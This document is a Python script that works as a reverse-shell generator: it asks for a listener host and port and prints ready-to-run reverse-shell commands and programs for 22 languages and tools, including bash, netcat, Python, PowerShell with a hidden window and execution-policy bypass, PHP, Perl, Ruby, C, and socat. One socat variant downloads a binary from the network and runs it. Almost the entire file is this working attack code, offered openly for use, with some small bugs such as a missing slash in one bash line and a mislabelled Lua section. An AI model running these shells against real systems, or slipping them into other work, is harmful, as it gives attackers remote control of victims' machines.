#!/usr/bin/python3

import sys
from colorama import Fore, Style

banner = f'''{Fore.YELLOW}
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
{Style.RESET_ALL}
References:
    https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

{Fore.YELLOW}What kind of shell do you want to generate?{Style.RESET_ALL}

[{Fore.GREEN}01{Style.RESET_ALL}] AWK                            [{Fore.GREEN}12{Style.RESET_ALL}] Netcat BusyBox
[{Fore.GREEN}02{Style.RESET_ALL}] Bash TCP                       [{Fore.GREEN}13{Style.RESET_ALL}] Netcat Traditional
[{Fore.GREEN}03{Style.RESET_ALL}] Bash UDP                       [{Fore.GREEN}14{Style.RESET_ALL}] NodeJS
[{Fore.GREEN}04{Style.RESET_ALL}] C                              [{Fore.GREEN}15{Style.RESET_ALL}] OpenSSL
[{Fore.GREEN}05{Style.RESET_ALL}] Dart                           [{Fore.GREEN}16{Style.RESET_ALL}] Perl
[{Fore.GREEN}06{Style.RESET_ALL}] Golang                         [{Fore.GREEN}17{Style.RESET_ALL}] PHP
[{Fore.GREEN}07{Style.RESET_ALL}] Groovy                         [{Fore.GREEN}18{Style.RESET_ALL}] PowerShell
[{Fore.GREEN}08{Style.RESET_ALL}] Java                           [{Fore.GREEN}19{Style.RESET_ALL}] Python
[{Fore.GREEN}09{Style.RESET_ALL}] Lua                            [{Fore.GREEN}20{Style.RESET_ALL}] Ruby
[{Fore.GREEN}10{Style.RESET_ALL}] Ncat                           [{Fore.GREEN}21{Style.RESET_ALL}] Socat
[{Fore.GREEN}11{Style.RESET_ALL}] Netcat OpenBsd                 [{Fore.GREEN}22{Style.RESET_ALL}] Telnet

'''

def awk(lhost, lport):
    shell = f'''

    {Fore.GREEN}AWK REVERSE SHELL{Style.RESET_ALL}
    '''+'''
    awk 'BEGIN {s = "/inet/tcp/0/'''+lhost+'/'+lport+'''"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null'''
    print(shell)
    sys.exit()

def bashTCP(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}BASH TCP REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
    
    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    0<&196;exec 196<>/dev/tcp/{lhost}{lport}; sh <&196 >&196 2>&196

    {Fore.YELLOW}Option 3{Style.RESET_ALL}:
    /bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1
    '''
    print(shell)
    sys.exit()

def bashUDP(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}BASH UDP REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Victim{Style.RESET_ALL}:
    sh -i >& /dev/udp/{lhost}/{lport} 0>&1
    
    {Fore.YELLOW}Listener{Style.RESET_ALL}:
    nc -u -lvp {lport}
    '''
    print(shell)
    sys.exit()

def C(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}C REVERSE SHELL{Style.RESET_ALL}
    
    #include <stdio.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>

    int main(void)''' + '{' + f'''
        int port = {lport};
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("{lhost}");''' + '''

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

        return 0;''' + f'''

        {Fore.GREEN}Compile with{Style.RESET_ALL}: gcc /tmp/shell.c --output csh && csh      
        '''
    print(shell)
    sys.exit()

def dart(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}DART REVERSE SHELL{Style.RESET_ALL}
    
    import 'dart:io';
    import 'dart:convert';

    main() ''' + '''{
        Socket.connect("'''+ lhost + '", ' + lport + ''').then((socket) {
            socket.listen((data) {
                Process.start('powershell.exe', []).then((Process process) {
                    process.stdin.writeln(new String.fromCharCodes(data).trim());
                    process.stdout
                        .transform(utf8.decoder)
                        .listen((output) { socket.write(output); });
                });
            },
            onDone: () {
                socket.destroy();
            });
        });
    }'''
    print(shell)
    sys.exit()

def golang(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}GOLANG REVERSE SHELL{Style.RESET_ALL}
    
    echo 'package main;import"os/exec";import"net";func main()''' + '{' + f'''c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()'''+"}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    print(shell)
    sys.exit()

def groovy(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}GROOVY REVERSE SHELL{Style.RESET_ALL}
    
    ''' + 'Thread.start {' + f'''
    String host="{lhost}";
    int port={lport};
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())'''+'{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n    }'
    print(shell)
    sys.exit()

def java(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}JAVA REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    Runtime r = Runtime.getRuntime();
    Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'");
    p.waitFor();

    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    Thread thread = new Thread()'''+ '''{
    public void run(){''' + f'''
        String host="{lhost}";
        int port={lport};
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())'''+'''{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
        }
    }
    thread.start();
    '''
    print(shell)
    sys.exit()

def lua(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}JAVA REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Linux only{Style.RESET_ALL}:
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
    
    {Fore.YELLOW}Windows and Linux{Style.RESET_ALL}:
    lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
    '''
    print(shell)
    sys.exit()

def ncat(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}NCAT REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}TCP{Style.RESET_ALL}:
    ncat {lhost} {lport} -e /bin/bash
    
    {Fore.YELLOW}UDP{Style.RESET_ALL}:
    ncat --udp {lhost} {lport} -e /bin/bash
    '''
    print(shell)
    sys.exit()

def ncOpenBsd(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}NETCAT OPENBSD REVERSE SHELL{Style.RESET_ALL}
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
    '''
    print(shell)
    sys.exit()

def ncBusyBox(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}NETCAT BUSYBOX REVERSE SHELL{Style.RESET_ALL}
    
    rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
    '''
    print(shell)
    sys.exit()

def ncTrad(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}NETCAT TRADITIONAL REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    nc -e /bin/sh {lhost} {lport}

    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    nc -e /bin/bash {lhost} {lport}

    {Fore.YELLOW}Option 3{Style.RESET_ALL}:
    nc -c bash {lhost} {lport}
    '''
    print(shell)
    sys.exit()

def node(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}NODEJS REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    (function()'''+'''{
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect('''+lport+', "'+lhost+'''", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();
    '''+f'''
    
    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    require('child_process').exec('nc -e /bin/sh {lhost} {lport}')
    
    {Fore.YELLOW}Option 3{Style.RESET_ALL}:
    -var x = global.process.mainModule.require
    -x('child_process').exec('nc {lhost} {lport} -e /bin/bash')
    '''
    print(shell)
    sys.exit()

def openSSL(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}OPENSSL REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Listener{Style.RESET_ALL}:
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
    
    {Fore.YELLOW}Victim{Style.RESET_ALL}:
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s
    '''
    print(shell)
    sys.exit()

def perl(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}PERL REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'''{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    '''+f'''
    
    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    
    {Fore.YELLOW}Windows only{Style.RESET_ALL}:
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    '''
    print(shell)
    sys.exit()

def php(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}PHP REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'
    
    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    
    {Fore.YELLOW}Option 3{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});`/bin/sh -i <&3 >&3 2>&3`;'
    
    {Fore.YELLOW}Option 4{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});system("/bin/sh -i <&3 >&3 2>&3");'
    
    {Fore.YELLOW}Option 5{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});passthru("/bin/sh -i <&3 >&3 2>&3");'
    
    {Fore.YELLOW}Option 6{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    
    {Fore.YELLOW}Option 7{Style.RESET_ALL}:
    php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    '''
    print(shell)
    sys.exit()

def powerShell(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}POWERSHELL REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%'''+'''{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''+f'''
        
    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%'''+'''{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    '''
    print(shell)
    sys.exit()

def python(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}PYTHON REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Linux Only{Style.RESET_ALL}:
        {Fore.YELLOW}Option 1{Style.RESET_ALL}:
        export RHOST="{lhost}";export RPORT={lport};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

        {Fore.YELLOW}Option 2{Style.RESET_ALL}:
        python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

        {Fore.YELLOW}Option 3{Style.RESET_ALL}:
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

        {Fore.YELLOW}Option 4{Style.RESET_ALL}:
        python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

        {Fore.YELLOW}Option 5 (no spaces){Style.RESET_ALL}:
        python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

        {Fore.YELLOW}Option 6 (no spaces){Style.RESET_ALL}:
        python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

        {Fore.YELLOW}Option 7 (no spaces){Style.RESET_ALL}:
        python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

        {Fore.YELLOW}Option 8 (no spaces, shortened){Style.RESET_ALL}:
        python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

        {Fore.YELLOW}Option 9 (no spaces, shortened){Style.RESET_ALL}:
        python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

        {Fore.YELLOW}Option 10 (no spaces, shortened){Style.RESET_ALL}:
        python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

        {Fore.YELLOW}Option 11 (no spaces, shortened further){Style.RESET_ALL}:
        python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

        {Fore.YELLOW}Option 12 (no spaces, shortened further){Style.RESET_ALL}:
        python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

        {Fore.YELLOW}Option 13 (no spaces, shortened further){Style.RESET_ALL}:
        python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

    {Fore.YELLOW}Windows only{Style.RESET_ALL}:
        C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{lhost}', {lport}'''+''')), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
        '''
    print(shell)
    sys.exit()

def ruby(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}RUBY REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Option 1{Style.RESET_ALL}:
    ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    {Fore.YELLOW}Option 2{Style.RESET_ALL}:
    ruby -rsocket -e'exit if fork;c=TCPSocket.new("{lhost}","{lport}");loop'''+'''{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
    '''+f'''
    {Fore.YELLOW}Windows only{Style.RESET_ALL}:
    ruby -rsocket -e 'c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r")'''+'''{|io|c.print io.read}end'
    '''
    print(shell)
    sys.exit()

def socat(lhost, lport):
    shell = f'''
    
    {Fore.GREEN}SOCAT REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}Listener{Style.RESET_ALL}:
    socat file:`tty`,raw,echo=0 TCP-L:{lport}
    
    {Fore.YELLOW}Victim{Style.RESET_ALL}:
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    
    {Fore.YELLOW}or{Style.RESET_ALL}:
    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    '''
    print(shell)
    sys.exit()

def telnet(lhost):
    shell = f'''
    
    {Fore.GREEN}TELNET REVERSE SHELL{Style.RESET_ALL}
    
    {Fore.YELLOW}In Listener machine start two listeners{Style.RESET_ALL}:
    nc -lvp 8080
    nc -lvp 8081
    
    {Fore.YELLOW}In Victim machine run below command:{Style.RESET_ALL}:
    telnet {lhost} 8080 | /bin/sh | telnet {lhost} 8081
    '''
    print(shell)
    sys.exit()

def main():
    print(banner)
    shell = input(f'{Fore.YELLOW}>{Style.RESET_ALL} ')
    lhost = input(f'{Fore.YELLOW}LHOST>{Style.RESET_ALL} ')
    lport = input(f'{Fore.YELLOW}LPORT>{Style.RESET_ALL} ')
    if shell == '1' or shell == '01':
        awk(lhost, lport)
    elif shell == '2' or shell == '02':
        bashTCP(lhost, lport)
    elif shell == '3' or shell == '03':
        bashUDP(lhost, lport)
    elif shell == '4' or shell == '04':
        C(lhost, lport)
    elif shell == '5' or shell == '05':
        dart(lhost, lport)
    elif shell == '6' or shell == '06':
        golang(lhost, lport)
    elif shell == '7' or shell == '07':
        groovy(lhost, lport)
    elif shell == '8' or shell == '08':
        java(lhost, lport)
    elif shell == '9' or shell == '09':
        lua(lhost, lport)
    elif shell == '10':
        ncat(lhost, lport)
    elif shell == '11':
        ncOpenBsd(lhost, lport)
    elif shell == '12':
        ncBusyBox(lhost, lport)
    elif shell == '13':
        ncTrad(lhost, lport)
    elif shell == '14':
        node(lhost, lport)
    elif shell == '15':
        openSSL(lhost, lport)
    elif shell == '16':
        perl(lhost, lport)
    elif shell == '17':
        php(lhost, lport)
    elif shell == '18':
        powerShell(lhost, lport)
    elif shell == '19':
        python(lhost, lport)
    elif shell == '20':
        ruby(lhost, lport)
    elif shell == '21':
        socat(lhost, lport)
    elif shell == '22':
        telnet(lhost)
    else:
        print(f'\n[{Fore.RED}-{Style.RESET_ALL}] Invalid option!')
        sys.exit()
        

if __name__ == '__main__':
    main()

print(banner)